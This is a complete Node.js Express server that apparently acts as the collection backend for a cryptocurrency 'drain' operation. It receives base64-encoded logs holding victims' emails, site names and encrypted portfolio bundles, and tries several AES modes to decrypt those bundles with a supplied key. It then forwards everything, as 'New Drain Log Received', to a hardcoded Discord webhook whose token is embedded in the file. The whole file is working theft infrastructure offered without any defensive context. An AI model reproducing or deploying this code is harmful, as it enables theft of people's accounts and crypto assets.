const express = require('express');
const axios = require('axios');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1517941078542516304/9C7lEa0iDJht0SSdJVYLhvFMEmAeHJEgMnmiD78BV98xN97HXLHJ4lYJAe8qGjdzk8tt";

app.use(express.raw({ type: '*/*', limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

app.get('/data/:payload', async (req, res) => {
    try {
        const encoded = req.params.payload;
        const decodedStr = Buffer.from(encoded, 'base64').toString('utf-8');
        let data = JSON.parse(decodedStr);

        console.log(`✅ New log from ${data.site || 'unknown'}`);

        if (data.portfolio) {
            data.portfolio = decryptPortfolio(data.portfolio);
        }

        await sendToDiscord(data);

        res.status(200).send('OK');
    } catch (error) {
        console.error("❌ Error:", error.message);
        res.status(400).send('Bad Request');
    }
});

function decryptPortfolio(portfolio) {
    const bundleKeyB64 = portfolio.bundleKey;
    if (!bundleKeyB64) return portfolio;

    if (portfolio.sBundles) {
        try {
            const bundles = JSON.parse(portfolio.sBundles);
            portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, bundleKeyB64));
        } catch (e) {}
    }

    if (portfolio.eBundles) {
        try {
            const bundles = JSON.parse(portfolio.eBundles);
            portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, bundleKeyB64));
        } catch (e) {}
    }

    return portfolio;
}

function decryptSingleBundle(bundleStr, bundleKeyB64) {
    if (!bundleStr.includes(':')) return { raw: bundleStr };

    const [prefix, encryptedPart] = bundleStr.split(':', 2);
    const result = tryDecryptAES(encryptedPart, bundleKeyB64);
    
    if (result.success) {
        try {
            return { prefix, data: JSON.parse(result.decrypted) };
        } catch {
            return { prefix, decrypted: result.decrypted };
        }
    } else {
        return { prefix, error: result.error, raw: encryptedPart };
    }
}

function tryDecryptAES(encryptedB64, keyB64) {
    const key = Buffer.from(keyB64, 'base64');

    const attempts = [
        { mode: 'aes-256-cbc', iv: Buffer.alloc(16, 0) },
        { mode: 'aes-256-cbc', iv: key.slice(0, 16) },
        { mode: 'aes-256-cbc', iv: Buffer.alloc(16) },
        { mode: 'aes-256-ecb', iv: null }
    ];

    for (const { mode, iv } of attempts) {
        try {
            const decipher = iv !== null 
                ? crypto.createDecipheriv(mode, key, iv)
                : crypto.createDecipher(mode, key);
            
            let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
            decrypted += decipher.final('utf8');
            return { success: true, decrypted };
        } catch (e) {}
    }

    return { success: false, error: "Decryption failed" };
}

async function sendToDiscord(data) {
    const embed = {
        title: "📥 New Axiom Log",
        color: 0xFF0000,
        fields: [
            { name: "Email", value: data.user?.email || "N/A", inline: true },
            { name: "Site", value: data.site || "N/A", inline: true }
        ]
    };

    try {
        await axios.post(DISCORD_WEBHOOK, {
            content: "**New Drain Log Received**",
            embeds: [embed],
            files: [{
                attachment: Buffer.from(JSON.stringify(data, null, 2), 'utf-8'),
                name: `axiom_log_${Date.now()}.json`
            }]
        });
    } catch (err) {
        console.error("Discord error:", err.message);
    }
}

app.listen(PORT, () => console.log(`🚀 Backend running on port ${PORT}`));
